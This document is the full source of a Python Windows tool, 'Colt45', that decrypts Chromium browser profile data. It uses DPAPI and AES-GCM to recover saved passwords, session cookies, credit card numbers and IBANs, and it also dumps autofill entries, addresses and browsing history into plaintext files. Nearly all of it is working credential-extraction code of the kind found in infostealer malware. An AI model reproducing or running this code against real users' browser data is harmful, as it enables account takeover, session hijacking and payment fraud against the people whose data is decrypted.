import os, sqlite3, time, threading, sys

from colorama import init, Fore, Style
from Crypto.Cipher import AES
from base64 import b64decode
from sqlite3 import connect as sql_connect
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from json import loads as json_loads, load


#########################################################
# ===================== INIT & HELP =================== #
#########################################################
init()

# delai=0.00 if you want to skip 
def progressive(texte, delai=0.00):
    for caractere in texte:
        sys.stdout.write(caractere)
        sys.stdout.flush()
        time.sleep(delai)

credits = (
    f"      {Fore.YELLOW}###########################################\n"
    f"      #  {Fore.GREEN}Coded by   :   {Fore.RED}raphaelthief            {Fore.YELLOW}#\n"
    f"      #  {Fore.GREEN}Product    :   Colt45 Production {Fore.RED}V1.0  {Fore.YELLOW}#\n"
    f"      ###########################################{Fore.GREEN}\n"
)

banner = (
     f"{Fore.RED}\n"
     f"                         ....{Fore.RED}\n"        
     f"                       %%%{Fore.YELLOW}##{Fore.RED}%%%              {Fore.GREEN}##   ##    ###    ##   ##\n"    
     f"                     {Fore.RED}%%%%%{Fore.YELLOW}+#{Fore.RED}%%%%%            {Fore.GREEN}###  ##   ## ##   ##   ##\n"    
     f"                     {Fore.RED}%%%%%{Fore.YELLOW}=*{Fore.RED}%%%%%            {Fore.GREEN}#### ##  ##   ##  ##   ##\n"     
     f"                   {Fore.RED}%%%%%%#{Fore.YELLOW}=+{Fore.RED}%%%%%%           {Fore.GREEN}#######  ##   ##   ## ##\n"     
     f"                  {Fore.RED}%%%%%%%%{Fore.YELLOW}+=*{Fore.RED}%%%%%%          {Fore.GREEN}## ####  #######   ## ##\n"     
     f"                 {Fore.RED}%%%%%%##{Fore.YELLOW}%*==*{Fore.RED}%%%%%%         {Fore.GREEN}##  ###  ##   ##    ###\n"     
     f"                {Fore.RED}%%%%%%%#{Fore.YELLOW}=*%+=+#{Fore.RED}%%%%%%        {Fore.GREEN}##   ##  ##   ##    ###\n"     
     f"               {Fore.RED}%%%%%%###{Fore.YELLOW}==**==+#{Fore.RED}%%%%%%\n"     
     f"              {Fore.RED}%%%%%%%*{Fore.YELLOW}#+===*+==+#{Fore.RED}%%%%%%      {Fore.YELLOW}### ###   ######  ####     ####     #######  ######\n"     
     f"             {Fore.RED}%%%%%%%#{Fore.YELLOW}+#=====*===+{Fore.RED}%%%%%%%      {Fore.YELLOW}## ##      ##     ##       ##       ##   #   ##  ##\n"     
     f"            {Fore.RED}%%%%%%%%{Fore.YELLOW}+#*=====+====*{Fore.RED}%%%%%%%     {Fore.YELLOW}## ##      ##     ##       ##       ##   #   ##  ##\n"     
     f"            {Fore.RED}%%%%%%%{Fore.YELLOW}++%+==========+{Fore.RED}%%%%%%%     {Fore.YELLOW}###        ##     ##       ##       ####     #####\n"     
     f"            {Fore.RED}%%%%%%{Fore.YELLOW}++{Fore.RED}#%{Fore.YELLOW}*===*--==+=+{Fore.RED}%%%%%%%     {Fore.YELLOW}####       ##     ##       ##       ##       ## ##\n"     
     f"            {Fore.RED}%%%%%{Fore.YELLOW}#=*{Fore.RED}%%#{Fore.YELLOW}=-+%+--=#=*{Fore.RED}%#%%%%%     {Fore.YELLOW}## ##      ##     ##  ##   ##  ##   ##   #   ## ##\n"     
     f"            {Fore.RED}%%%%%{Fore.YELLOW}*=#{Fore.RED}%%%{Fore.YELLOW}#=*%*--=%+%%{Fore.RED}#%%%%%    {Fore.YELLOW}### ###   ######  #######  #######  #######  #### ##\n"     
     f"             {Fore.RED}%%%%{Fore.YELLOW}#=#{Fore.RED}%%%%{Fore.YELLOW}#*%#==###%+#{Fore.RED}%%%%\n"     
     f"              %%%%{Fore.YELLOW}**{Fore.RED}%%%%%%%{Fore.YELLOW}#+#%#*+*{Fore.RED}%%%%\n"     
     f"               %%%%{Fore.YELLOW}#*{Fore.RED}%%%%%%{Fore.YELLOW}#**++*#{Fore.RED}%%%%\n"     
     f"                  %%%#%%%#*##%%%%%%\n"     
     f"                      ........{Fore.GREEN}\n"
)       

helper = (
    f"{Fore.YELLOW}This program aims to decrypt browser data. The following files are therefore necessary :\n"
    f"{Fore.RED}Local State {Fore.GREEN}for encrypton key\n"
    f"{Fore.RED}Web Data {Fore.GREEN}for personnal infos, autofill, credit cards ...\n"
    f"{Fore.RED}Login Data {Fore.GREEN}for passwods\n"
    f"{Fore.RED}History {Fore.GREEN}for nagiation history\n"
    f"{Fore.RED}Cookies {Fore.GREEN}for user's cookies\n\n"
    f"Use {Fore.RED}option 2 {Fore.GREEN}to search for files in the execution folder\n"
    f"Use {Fore.RED}option 3 {Fore.GREEN}to search for files in custom folder\n\n"
)


#########################################################
# ====================== SETTINGS ===================== #
#########################################################

######################## Set variables
global CookiCount, PasswCount

CookiCount, PasswCount = 0, 0


######################## Write files : Passwd & Cookies
def writeforfile(data, name):

    dossierpath = os.path.dirname(os.path.abspath(__name__))
  
    path = dossierpath + f"\\{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")


######################## Decrypt stuff
class DATA_BLOB_BROWSER(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB_BROWSER(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB_BROWSER(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB_BROWSER()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)


######################## Clear empty files
def clearit():
    try:
        ciblex = os.getcwd()
        for file_name in os.listdir(ciblex):
            dirx = os.path.join(ciblex, file_name)
        
            if os.path.isfile(dirx):
            
                try:
                    if os.path.getsize(dirx) == 0:
                        os.remove(dirx)
                        print(f"{Fore.YELLOW}[-] {Fore.GREEN}File deleted : {file_name}")
                except:
                    print(f" {Fore.RED}¤ {Fore.GREEN}Error occured on : {file_name}")
                
    except erreurs as e:
        print(f"\n{Fore.RED}Global error with cleaning files ...")
        

######################## Passwd
Passw = []
def getPassw(path, PassX, KeyX):
    
    try:
    
        global Passw, PasswCount
        if not os.path.exists(path): return

        pathC = path + "\\" + PassX
        if os.stat(pathC).st_size == 0: return
    
        connex = sql_connect(pathC)
        cursor = connex.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        donnees = cursor.fetchall()
        cursor.close()
        connex.close()

        pathKey = path + "\\" + KeyX
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for datX in donnees: 
            if datX[0] != '':
                Passw.append(f"\n------------------------------\nURL:  {datX[0]} \nUSER:  {datX[1]} \nPASS:  {DecryptValue(datX[2], master_key)}\n------------------------------\n")
                PasswCount += 1
        writeforfile(Passw, f'{PassX}')
        
        print(f"{Fore.YELLOW}[+] {Fore.GREEN}{PassX} found")
    except Exception as e:
        print(f" {Fore.RED}¤ {Fore.GREEN}Password {PassX} : {e}")


######################## Cookies
Cookies = []    
def getCookie(path, CookX, KeyX):

    try:
        global Cookies, CookiCount
        if not os.path.exists(path): return
    
        pathC = path + "\\" + CookX
        if os.stat(pathC).st_size == 0: return
    
    
        connex = sql_connect(pathC)
        cursor = connex.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        donnees = cursor.fetchall()
        cursor.close()
        connex.close()
    

        pathKey = path + "\\" + KeyX
    
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for datX in donnees: 
            if datX[0] != '':
                Cookies.append(f"\n------------------------------\nHost Key :  {datX[0]} \nName :  {datX[1]} \nCrypted Value : {datX[2]} \nDecrypted Value :  {DecryptValue(datX[2], master_key)}\n------------------------------\n")
                CookiCount += 1
        writeforfile(Cookies, f'{CookX}')
        
        print(f"{Fore.YELLOW}[+] {Fore.GREEN}{CookX} found")
    except Exception as e:
        print(f" {Fore.RED}¤ {Fore.GREEN}Cookies {CookX} : {e}")
   
    
#########################################################
# ====================== History ====================== #
#########################################################
def extract_history(pathx):
    try:
        nom_fichier = f"History"
        DB_PATH = os.path.join(pathx, nom_fichier)

        def extract_urls_table():
            db = sqlite3.connect(DB_PATH)
            cursor = db.cursor()
            query = "SELECT * FROM urls"
            cursor.execute(query)
            donnees = cursor.fetchall()
            db.close()
            return donnees

        donnees = extract_urls_table()

        with open(f"History.txt", "w", encoding="utf-8") as f:
            for datX in donnees:
                id = datX[0]
                url = datX[1]
                title = datX[2]
                visit_count = datX[3]
                typed_count = datX[4]
                last_visit_time = datX[5]
                hidden = datX[6]

                last_visit_time_str = ""
                if last_visit_time != 0:
                    last_visit_time_str = str(last_visit_time)

                f.write(f"URL : {url}\nTitle : {title}\nVisits : {visit_count} \n\n")

        print(f"{Fore.YELLOW}[+] {Fore.GREEN}History found")
    except Exception as e:
        print(f" {Fore.RED}¤ {Fore.GREEN}History : {e}")


#########################################################
# ====================== Autofill ===================== #
#########################################################
def extract_data(pathx):
    try:
        dossierpath = pathx
        nom_fichier = f"Web Data"
        chemin_fichier = os.path.join(dossierpath, nom_fichier)

        connexion = sqlite3.connect(chemin_fichier)
        curseur = connexion.cursor()

        requete_sql = "SELECT name, value FROM autofill"
        curseur.execute(requete_sql)

        donnees = curseur.fetchall()

        connexion.close()

        with open(f"Autofill.txt", 'w', encoding='utf-8') as fichier:
            for datX in donnees:
                fichier.write(f"Name: {datX[0]}\n")
                fichier.write(f"Value: {datX[1]}\n")
                fichier.write("-------------------------\n")

        print(f"{Fore.YELLOW}[+] {Fore.GREEN}autofill found")

    except Exception as e:
        print(f" {Fore.RED}¤ {Fore.GREEN}Autofill : {e}")


#########################################################
# ==================== Credit Cards =================== #
#########################################################
def extract_credit_card_data(pathx):
    try:
        dossierpath = pathx
        nom_fichier = f"Web Data"
        chemin_fichier = os.path.join(dossierpath, nom_fichier)

        connexion = sqlite3.connect(chemin_fichier)
        curseur = connexion.cursor()

        requete_sql = "SELECT card_number_encrypted, name_on_card, expiration_month, expiration_year FROM credit_cards"
        curseur.execute(requete_sql)

        donnees = curseur.fetchall()
        connexion.close()

        pathKey = dossierpath + f'\\Local State'
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        with open(f"CreditCards.txt", 'w', encoding='utf-8') as fichier:
            for datX in donnees:
                fichier.write(f"Card Number: {DecryptValue(datX[0], master_key)}\n")
                fichier.write(f"Name Owner: {datX[1]}\n")
                fichier.write(f"Expiration month: {datX[2]}\n")
                fichier.write(f"Expiration year: {datX[3]}\n")
                fichier.write("-------------------------\n")

        print(f"{Fore.YELLOW}[+] {Fore.GREEN}credit card found")

    except Exception as e:
        print(f" {Fore.RED}¤ {Fore.GREEN}Credit card : {e}")


#########################################################
# ======================== IBAN ======================= #
#########################################################
def IBAN(pathx):
    try:
        dossierpath = pathx
        nom_fichier = f"Web Data"
        chemin_fichier = os.path.join(dossierpath, nom_fichier)

        connexion = sqlite3.connect(chemin_fichier)
        curseur = connexion.cursor()

        requete_sql = "SELECT value_encrypted, nickname FROM local_ibans"
        curseur.execute(requete_sql)

        donnees = curseur.fetchall()
        connexion.close()

        pathKey = dossierpath + f'\\Local State'
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])



        with open(f"IBAN.txt", 'w', encoding='utf-8') as fichier:
            for datX in donnees:
                fichier.write(f"IBAN: {DecryptValue(datX[0], master_key)}\n")
                fichier.write(f"Nickname: {datX[1]}\n")
                fichier.write("-------------------------\n")

        print(f"{Fore.YELLOW}[+] {Fore.GREEN}IBAN found")

    except Exception as e:
        print(f" {Fore.RED}¤ {Fore.GREEN}IBAN : {e}")


#########################################################
# ================== Personnal adress ================= #
#########################################################
def extract_personnal_location(pathx):
    try:
        dossierpath = pathx
        nom_fichier = "Web Data"
        chemin_fichier = os.path.join(dossierpath, nom_fichier)

        connexion = sqlite3.connect(chemin_fichier)
        curseur = connexion.cursor()

        requete_sql = "SELECT value FROM local_addresses_type_tokens"
        curseur.execute(requete_sql)

        donnees = curseur.fetchall()

        connexion.close()

        with open("Personnal adresses - infos.txt", 'w', encoding='utf-8') as fichier:
            unique_addresses = set()  
            for datX in donnees:
                adresse = datX[0].strip()  
                if adresse and adresse not in unique_addresses:
                    fichier.write(f"{adresse}\n")
                    unique_addresses.add(adresse)

        print(f"{Fore.YELLOW}[+] {Fore.GREEN}Personal addresses / infos found")

    except Exception as e:
        print(f" {Fore.RED}¤ {Fore.GREEN}Personal addresses / infos : {e}")


#########################################################
# ================== Passwd & Cookies ================= #
#########################################################
def getPasswdAndCookies(pathx):
   
    targetpath = pathx  

    getPassw(targetpath, "Login Data", "Local State")
    getCookie(targetpath, "Cookies", "Local State")


#########################################################
# ====================== Launch ======================= #
#########################################################
def option2():
    dossierpath = os.path.dirname(os.path.abspath(__file__))
    extract_history(dossierpath)
    extract_data(dossierpath)
    extract_credit_card_data(dossierpath)
    extract_personnal_location(dossierpath)
    getPasswdAndCookies(dossierpath)
    IBAN(dossierpath)
    
    print(f"\n{Fore.YELLOW}=============== {Fore.GREEN}Clearing empty files {Fore.YELLOW}===============\n")
    clearit()
    print(f"\n{Fore.YELLOW}Files extracted to : {Fore.GREEN} {dossierpath}")
    print(f"\n{Fore.YELLOW}########################## {Fore.GREEN}END {Fore.YELLOW}##########################")

def custompath():
    return input(f"{Fore.GREEN}Folder path : {Fore.YELLOW}")

def option3():
    extracted = os.path.dirname(os.path.abspath(__file__))
    dossierpath = custompath()

    extract_history(dossierpath)
    extract_data(dossierpath)
    extract_credit_card_data(dossierpath)
    extract_personnal_location(dossierpath)
    getPasswdAndCookies(dossierpath)
    IBAN(dossierpath)
    
    print(f"\n{Fore.YELLOW}=============== {Fore.GREEN}Clearing empty files {Fore.YELLOW}===============\n")
    clearit()
    print(f"\n{Fore.GREEN}Files extracted to : {Fore.YELLOW} {extracted}")
    print(f"\n{Fore.YELLOW}########################## {Fore.GREEN}END {Fore.YELLOW}##########################")

def recurrence():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(banner)
    print(credits)    
    menu()
    
def menu():
    print(f"\n{Fore.YELLOW}Choose option :")
    print(f" {Fore.RED}1{Fore.GREEN}. Help -- Show program helper")
    print(f" {Fore.RED}2{Fore.GREEN}. Use application path")
    print(f" {Fore.RED}3{Fore.GREEN}. Select specific path")
    print(f" {Fore.RED}4{Fore.GREEN}. Exit")
    choix = input(F"{Fore.YELLOW}Select 1 to 4 : {Fore.GREEN}")

    if choix == "1":
        print("")
        print(helper)
        input("Press [ENTER] to continue ...")
        recurrence()
        
    elif choix == "2":
        print("")
        print(f"{Fore.YELLOW}=============== {Fore.GREEN}Extracting Datas {Fore.YELLOW}===============\n")
        option2()
        
    elif choix == "3":
        print("")
        print(f"{Fore.YELLOW}=============== {Fore.GREEN}Extracting Datas {Fore.YELLOW}===============\n")
        option3()
        
    elif choix == "4":
        print("")
        exit()
        
    else:
        print("Invalid choice ...\n")
        recurrence()

#########################################################
# ===================== MAIN MENU ===================== #
#########################################################
def main():
    os.system('cls' if os.name == 'nt' else 'clear') # Linux or Windows OS detection & compatibility
    progressive(banner)
    print(credits)    
    #input("Press [ENTER] to continue ...")
    menu()

if __name__ == "__main__":
    main()